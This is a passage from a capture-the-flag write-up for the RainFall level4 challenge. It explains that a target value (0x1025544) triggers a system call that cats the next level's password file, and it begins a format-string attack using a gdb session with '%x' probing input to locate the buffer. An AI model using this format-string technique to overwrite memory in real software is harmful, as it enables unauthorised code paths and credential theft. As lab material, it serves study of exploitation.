We see that if the return value of function p is not equal to 0x1025544 we leave but if it is equal it is going to call system function.

Checking rodata section we see that the string used for system call is:
```bash
level4@RainFall:~$ objdump -s -j .rodata level4

level4:     file format elf32-i386

Contents of section .rodata:
 8048588 03000000 01000200 2f62696e 2f636174  ......../bin/cat
 8048598 202f686f 6d652f75 7365722f 6c657665   /home/user/leve
 80485a8 6c352f2e 70617373 00                 l5/.pass.
```

So we need to put 0x1025544 at 0x8049810 to display the flag.
We are going to use the same technic as in the previous exercice because it is the same vulnerability.

We just need to find where the buffer is starting so we are using gdb to do this:
```bash
level4@RainFall:~$ gdb level4
(gdb) run
Starting program: /home/user/level4/level4 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
